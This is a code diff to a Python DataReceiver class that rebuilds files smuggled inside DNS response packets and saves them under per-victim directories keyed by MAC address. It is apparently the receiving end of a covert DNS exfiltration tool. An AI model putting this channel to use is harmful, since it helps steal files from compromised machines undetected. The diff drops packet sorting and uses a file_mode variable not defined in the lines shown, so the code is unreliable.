@@ -9,6 +9,7 @@ from operator import attrgetter
 
 from utils.request_type import RequestType
 from utils.data_req_type import DataRequestType
+from utils.data_file_type import DataFileType
 from utils.mac import Mac
 from command.cmdparser import CommandParser
 
@@ -89,6 +90,7 @@ class DataReceiver():
             dnsrr_layer = pkt.getlayer(DNSRR)
             dns_layer = pkt.getlayer(DNS)
             self.file_transfer[key] = [PacketData(0, dnsrr_layer.rdata)]
+
         elif dnsqr_layer.qclass == DataRequestType.NORMAL:
             dnsrr_layer = pkt.getlayer(DNSRR)
             dns_layer = pkt.getlayer(DNS)
@@ -99,11 +101,10 @@ class DataReceiver():
             self.file_transfer[key].append(PacketData(dns_layer.opcode, dnsrr_layer.rdata))
 
             # Sort packets since they may be out of order
-            self.file_transfer[key] = sorted(self.file_transfer[key], key=attrgetter('index'))
 
             # Write to file from buffer
             victim_dir = self.rel_path + str(victim_mac)
-            with open(victim_dir + '/files/' + filename, 'w+') as f:
+            with open(victim_dir + '/files/' + filename, file_mode) as f:
                 buf = ''
                 print(self.file_transfer[key])
                 for packet in self.file_transfer[key]:
